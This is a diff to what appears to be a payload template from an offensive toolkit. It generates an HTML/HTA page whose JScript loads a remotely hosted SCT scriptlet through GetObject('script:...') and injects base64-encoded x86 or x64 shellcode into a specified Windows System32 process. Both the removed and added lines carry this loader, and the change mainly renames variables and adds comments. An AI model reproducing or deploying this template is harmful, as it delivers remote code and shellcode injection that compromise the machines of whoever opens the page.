@@ -18,11 +18,23 @@ value: notSet
 [Template]
 data:
 	<html>
-		<script>
-			var a = GetObject('script:${HostedDomain:value}/${HostedSct:value}');
-			var x86 = "${ShellCodex86:value}"
-			var x64 = "${ShellCodex64:value}"
-			a.Exec(x86, x64, 'C:\\Windows\\System32\\${Process:value}');
-			close();
-		</script>
-	</html>
+        <body>
+            <script language="JScript">
+                // URL to SCT file here
+                // Example: GetObject('https://stuff.com/README.txt');
+                var a = GetObject('script:${HostedDomain:value}/${HostedSct:value}');
+
+                // Base64-encoded x86 shellcode
+                var x86_sc = '${ShellCodex86:value}';
+
+                // Base64-encoded x64 shellcode
+                var x64_sc = '${ShellCodex64:value}';
+
+                // Process to inject shellcode into (full path required)
+                var spawn_process = 'C:\\Windows\\System32\\${Process:value}';
+
+                // Injects shellcode into specified process
+                a.Inject(x86_sc, x64_sc, spawn_process);
+            </script>
+        </body>
+    </html>
